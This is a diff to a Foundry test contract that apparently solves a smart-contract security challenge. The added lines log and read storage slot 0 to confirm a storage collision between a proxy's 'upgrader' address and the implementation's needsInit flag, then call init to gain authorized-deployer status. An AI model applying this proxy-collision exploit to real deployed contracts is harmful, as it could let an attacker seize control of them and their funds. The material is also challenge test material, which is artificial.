@@ -277,8 +277,15 @@ contract ChallengeSolver is Test {
         address[] memory aims = new address[](1);
         aims[0] = USER_DEPOSIT_ADDRESS;
 
-        // check needsInit value
-        console.log("authorizer needsInit: ", authorizer.needsInit());
+        // check needsInit value and investigate
+        console.log("authorizer needsInit: ", authorizer.needsInit()); // needsInit = 209895567101503440808722102436816545213904643469
+        // this provides evidence of a storage collision happening between the proxy and the implementation contract both saving variables to slot 0
+        // check value actually stored at needsInits location
+        bytes32 slot0 = vm.load(address(authorizer), bytes32(uint256(0)));
+        console.logBytes32(slot0); // slot0 = 0x00000000000000000000000024c40af179e495d68f60b70a84edeedbd5e4e58d
+        // this shows an address is saved to this location on the proxy contract
+        // we can see that the TransparentProxy contract has `address public upgrader = msg.sender;` declared as the first state variable that will be stored to slot0
+        // this confirms our storage collision suspicion
 
         // ensure init can still be called. If needsInit = 0 then init is locked
         if (authorizer.needsInit() == 0) {
@@ -286,6 +293,9 @@ contract ChallengeSolver is Test {
         }
         // call init to approve this contract as an authorized safe proxy deployer at USER_DEPOSIT_ADDRESS
         authorizer.init(wards, aims);
+
+        // verify init successfully set slot(0) needsInit/upgrader to 0
+        console.log("authorizer needsInit after init call: ", authorizer.needsInit());
     }
 
     // load initialization data, find required saltNonce, deploy safe proxy at desired address, and setup safe on behalf of user
